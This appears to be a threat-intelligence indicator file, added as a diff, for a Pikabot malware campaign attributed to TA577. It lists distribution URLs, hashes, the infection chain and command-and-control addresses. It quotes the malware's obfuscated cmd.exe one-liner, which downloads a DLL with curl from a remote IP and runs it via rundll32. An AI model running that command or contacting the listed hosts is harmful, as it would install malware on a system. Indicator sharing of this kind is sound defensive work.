@@ -1,0 +1,72 @@
+24.10.2023 | Pikabot | TA577 | 1.1.15-ghost
+
+*************************************************
+
+.url https://9jaflaverstore.com/uss/?1337
+.url https://coffesso.com/sei/?1337
+.zip 4f0f22dd463ccbb4c49104135572025f9886ed6e94585706d3189639885d52e5
+.dll 4c53383c1088c069573f918c0f99fe30fa2dc9e28e800d33c4d212a5e4d36839
+
+*************************************************
+
+url > zip > js > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\T1.js
+
+cmd.exe /c bo || EchO bo & ping bo || CurL http://155.138.224.36/abb/unsec -o %tMp%\bo.dlld & ping -n 2 bo || rundLL32 %tmP%\bo.dlld, Crash & exIt GMDeoHZtDpvO
+
+ping  bo
+
+ping  -n 2 bo
+
+rundLL32 C:\Users\Admin\AppData\Local\Temp\bo.dlld, Crash 
+
+*************************************************
+
+distro url
+
+https://pantiwilasa.app/teq/?1337
+
+*************************************************
+
+.dll distro
+
+http://155.138.224.36/abb/unsec
+http://45.63.67.40/vdQ/emiss
+
+*************************************************
+
+c2's
+
+51.68.146.19:5242
+45.33.76.163:2223
+139.177.198.199:2226
+172.234.29.13:2224
+172.233.187.145:2226
+15.235.143.190:2224
+154.221.30.136:13724
+
+Updated C2's
+
+172.233.186.50:5632
+198.244.141.4:9785
+176.58.102.36:2225
+217.69.8.229:13782
+45.79.147.119:9785
+139.144.215.192:13785
+172.232.24.58:2226
+
+HTTPS Checking Traffic 
+
+https://15.235.143.190:2224/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://51.68.146.19:5242/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://172.233.187.145:2226/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://172.234.29.13:2224/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://45.33.76.163:2223/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://154.221.30.136:13724/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://139.177.198.199:2226/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://15.235.143.190:2224/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+https://51.68.146.19:5242/holdable/aeoAdIPXrgFyXmJ1?TapetaCockbilled=Procrastination
+
+
+
